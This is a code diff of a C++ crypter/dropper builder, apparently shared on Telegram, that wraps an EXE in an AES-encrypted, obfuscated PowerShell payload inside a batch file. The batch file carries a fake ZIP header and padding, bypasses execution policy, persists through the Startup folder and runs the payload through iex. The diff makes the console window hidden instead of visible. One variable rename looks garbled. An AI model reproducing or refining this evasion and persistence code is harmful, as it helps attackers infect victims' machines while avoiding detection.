@@ -203,7 +203,7 @@ int main() {
 
     try {
         std::string exe_path;
-        std::cout << "Enter path to EXE file - fedx988: ";
+        std::cout << "Enter path to EXE file: ";
         std::getline(std::cin, exe_path);
 
         // Generate random AES key
@@ -262,7 +262,7 @@ int main() {
         std::string inner_ps1_script =
             "$policy = Get-ExecutionPolicy;"
             "if ($policy -eq 'Restricted' -or $policy -eq 'AllSigned') {"
-            "    Start-Process powershell -ArgumentList \"-ExecutionPolicy Bypass -EncodedCommand $([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Content -Path $env:currentBatPath -Raw))))\" -NoNewWindow;"
+            "    Start-Process powershell -ArgumentList \"-ExecutionPolicy Bypass -EncodedCommand $([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Content -Path $env:currentBatPath -Raw))))\" -WindowStyle Hidden;"
             "    exit;"
             "}"
             "$startupPath = [Environment]::GetFolderPath('Startup') + '\\\\" + startup_name + "';"
@@ -312,8 +312,8 @@ int main() {
         inner_ps1_script = inner_ps1_script_with_comments;
 
         // Apply variable obfuscation
-        for (const auto& [original, obf] : ps_vars) {
-            replace_all(inner_ps1_script, "$" + original, "$" + obf);
+        for (const auto& [superintendent, obf] : ps_vars) {
+            replace_all(inner_ps1_script, "$" + superintendent, "$" + obf);
         }
 
         // Write the obfuscated PowerShell script to output.ps1 and set timestamp
@@ -326,7 +326,7 @@ int main() {
 
         // Generate a massive block of colons
         std::string colon_block;
-        const int num_lines = 750;
+        const int num_lines = 700;
         const int colons_per_line = 200;
         for (int i = 0; i < num_lines; ++i) {
             colon_block += std::string(colons_per_line, ':') + "\n";
@@ -335,7 +335,7 @@ int main() {
         // Generate random batch file marker
         std::string random_marker = generate_random_var_name(8);
 
-        // BAT template with fake ZIP header, random delay, comments, and random marker
+        // BAT template with fake ZIP header, comments, random marker, and instant window hiding
         std::string bat_template =
             "REM PK\x03\x04\x14\x00\x00\x00\x08\x00 (Fake ZIP header)\n" +
             colon_block +
@@ -343,11 +343,9 @@ int main() {
             "@echo off\n"
             "setlocal\n"
             "set \"currentBatPath=%~f0\"\n"
-            "timeout /t %random:~-1,1% >nul\n" +
-            "start /b powershell -exec bypass -C \"[Environment]::SetEnvironmentVariable('GBSKABG', $env:GBSKABG); iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-Content '%~f0' -raw | Select-String (':' + ':" + random_marker + "::(.*)')).Matches.Groups[1].Value)))\" >nul 2>&1\n"
-            "::" + random_marker + "::" + ps_base64 + "\n"
-            "endlocal\n"
+            "powershell -WindowStyle Hidden -exec bypass -C \"[Environment]::SetEnvironmentVariable('GBSKABG', $env:GBSKABG); iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-Content '%~f0' -raw | Select-String (':' + ':" + random_marker + "::(.*)')).Matches.Groups[1].Value)))\" >nul 2>&1\n"
             "exit /b\n" +
+            "::" + random_marker + "::" + ps_base64 + "\n" +
             "REM " + generate_random_var_name(10) + "\n" +
             colon_block;
 
@@ -356,7 +354,7 @@ int main() {
         write_file(bat_filename, bat_template);
         set_random_file_timestamp(bat_filename);
 
-        std::cout << "Generated " << bat_filename << " and " << ps1_filename << " with AES-256 encrypted PowerShell payload, random AES key, randomized variables, random startup name, random batch marker, randomized timestamps, fake ZIP header, and split strings. - fedx988 on tele\n";
+        std::cout << "Generated " << bat_filename << " and " << ps1_filename << " with AES-256 encrypted PowerShell payload, random AES key, randomized variables, random startup name, random batch marker, randomized timestamps, fake ZIP header, split strings, and instantly hidden command window. - fedx988 on tele\n";
 
     }
     catch (const std::exception& e) {
